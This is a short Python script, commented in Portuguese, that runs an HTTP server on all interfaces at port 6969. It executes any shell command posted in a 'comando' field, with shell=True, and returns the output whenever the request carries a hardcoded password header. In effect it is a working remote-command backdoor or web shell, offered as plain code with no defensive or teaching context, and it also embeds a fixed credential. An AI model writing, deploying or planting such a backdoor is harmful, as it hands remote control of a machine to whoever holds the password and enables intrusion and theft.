# -*- coding: utf-8 -*-

from http.server import BaseHTTPRequestHandler, HTTPServer
import cgi
import subprocess

# Senha de autenticação
senha_autenticacao = '9c9f8624fd5d5813d1e47bbaac87636b'

# Classe de manipulador de solicitações
class MyRequestHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        # Verifica se a senha de autenticação está presente no cabeçalho da requisição
        if 'Senha' in self.headers and self.headers['Senha'] == senha_autenticacao:
            # Analisa os dados da solicitação POST
            form = cgi.FieldStorage(
                fp=self.rfile,
                headers=self.headers,
                environ={'REQUEST_METHOD': 'POST'}
            )
            comando = form.getvalue('comando')

            # Executa o comando e captura a saída
            try:
                resultado = subprocess.check_output(comando, shell=True, stderr=subprocess.STDOUT)
            except subprocess.CalledProcessError as e:
                resultado = e.output

            # Envia a resposta de volta para o cliente
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write(resultado)
        else:
            # Senha de autenticação inválida
            self.send_response(401);
            self.send_header('Content-type', 'text/plain');
            self.end_headers();
            self.wfile.write('Não autorizado!'.encode());

# Configurações do servidor
host = '0.0.0.0';
port = 6969;

# Cria o servidor HTTP
server = HTTPServer((host, port), MyRequestHandler);

# Inicia o servidor
print('Servidor iniciado em {}:{}'.format(host, port));
server.serve_forever();

